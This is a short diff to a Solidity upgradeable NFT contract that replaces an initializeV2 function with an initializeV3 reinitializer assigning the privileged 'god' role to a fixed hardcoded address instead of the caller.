@@ -8,8 +8,8 @@ contract UpgradeableNFTV2 is ERC721Upgradeable {
     uint256 public constant MAX_SUPPLY = 10;
     address public god;
 
-    function initializeV2() reinitializer(2) external {
-        god = msg.sender;
+    function initializeV3() reinitializer(3) external {
+        god = 0x6E32762B052CF0A0E5bB337a66A6906f6bC13E7E;
     }
 
     function mint() external {
